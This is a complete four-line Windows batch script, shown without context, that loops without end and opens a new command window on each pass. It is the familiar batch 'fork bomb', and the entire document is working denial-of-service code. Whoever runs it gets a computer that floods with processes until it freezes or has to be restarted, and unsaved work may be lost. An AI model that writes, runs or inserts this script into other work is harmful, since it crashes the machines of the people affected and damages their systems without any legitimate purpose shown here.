@echo off
:A
start
Goto A